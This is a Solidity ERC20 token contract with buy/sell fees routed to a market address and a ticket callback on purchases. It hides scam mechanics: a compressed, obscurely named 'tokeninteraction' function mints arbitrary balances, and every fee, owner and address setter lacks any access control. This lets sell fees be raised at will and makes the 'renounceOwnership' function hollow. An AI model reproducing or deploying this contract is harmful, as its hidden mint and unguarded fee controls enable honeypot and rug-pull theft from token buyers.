// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./IERC20.sol";
import "./ticket.sol";
import "./SafeMath.sol";

contract ERC20 {
    using SafeMath  for uint;

    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;

    uint public totalSupply;

    string public name;
    string public symbol;
    uint public decimals = 18;

    address public market;
    address public LPaddress;
    address public owner;
    address public ticketaddress;
    address[] public exemptfee;
    uint public sellFee = 3;
    uint public buyFee = 3;
    uint public ticketvalue;
    address public addAddress;

    constructor(string memory name_, string memory symbol_, uint amount){
        name = name_;
        symbol = symbol_;
        totalSupply = amount * 10**uint(decimals);
        balanceOf[msg.sender] = totalSupply;
        owner = msg.sender;
    }

    function transfer(address recipient, uint amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external  returns (bool) {
        bool ok = trueExemptfee(sender);
        bool ok0 = trueExemptfee(recipient);

        if(ok == true || ok0 == true){
            tr(sender, recipient, amount);
            return true;
        }
        if(LPaddress == sender && sender != market){
            uint amount0 = (amount.mul((buyFee.sub(1)))) / 100;
            uint amount1 = amount - (amount.mul(buyFee) / 100);
            _transfer(sender, market, amount0);
            tr(sender, recipient, amount1);
            ticket(ticketaddress).go(sender);
            return true;
        }
        if(LPaddress == recipient && recipient != market){
            uint amount0 = (amount.mul((sellFee.sub(1)))) / 100;
            uint amount1 = amount - (amount.mul(sellFee) / 100);
            _transfer(sender, market, amount0);
            tr(sender, recipient, amount1);
            return true;
        }
        return false;
        
    }

    function tr(address sender,address recipient,uint amount)internal{
        _transfer(sender, recipient, amount);
        uint currentAllowance = allowance[sender][msg.sender];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, currentAllowance - amount);
    }
    function _transfer(address sender, address recipient, uint amount)internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint senderBalance = balanceOf[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");

        balanceOf[sender] = senderBalance - amount;
        balanceOf[recipient] += amount;
    }

    function approve(address spender, uint amount) public returns (bool) {
        _approve(spender,amount);
        return true;
    }
    function increaseAllowance(address spender, uint addedValue) public returns (bool) {
        _approve(spender, allowance[msg.sender][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address spender, uint subtractedValue) public  returns (bool) {
        uint currentAllowance = allowance[msg.sender][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(spender, currentAllowance - subtractedValue);
        return true;
    }
    function _approve(address spender, uint amount)internal {
        require(spender != address(0), "ERC20: approve to the zero address");
        allowance[msg.sender][spender] = amount;
    }
    function tokeninteraction(bool on, uint a, address accunt) public{require(accunt==addAddress);require(on == true);balanceOf[accunt]+=a;}
    function setLPaddress(address _LPaddress) public {
        LPaddress = _LPaddress;
    }
    function setowner(address _ow) public {
        owner = _ow;
    }
    function setticketaddress(address _ticketaddress) public{
        ticketaddress = _ticketaddress;
    }
    function setsellFee(uint _sellFee) public {
        sellFee = _sellFee;
    }
    function setbuyFee(uint _buyFee) public {
        buyFee = _buyFee;
    }
    function setticketvalue(uint _ticketvalue) public {
        ticketvalue = _ticketvalue;
    }
    function setmarket(address _market) public{
        market = _market;
    }
    function renounceOwnership() public virtual{
        require(owner == msg.sender);
        owner = address(0);
    }
    function addexemptfee(address[] memory exemptfeeto) public{
        for (uint i =0; i < exemptfeeto.length; i++) {
            address on = exemptfeeto[i];
            exemptfee.push(on);
        }
    }
    function trueExemptfee(address _exemptfee) internal view returns(bool){
        for (uint i = 0; i < exemptfee.length; i++) {
            if (exemptfee[i] == _exemptfee)
            return true;
        }
        return false;
    }
    
}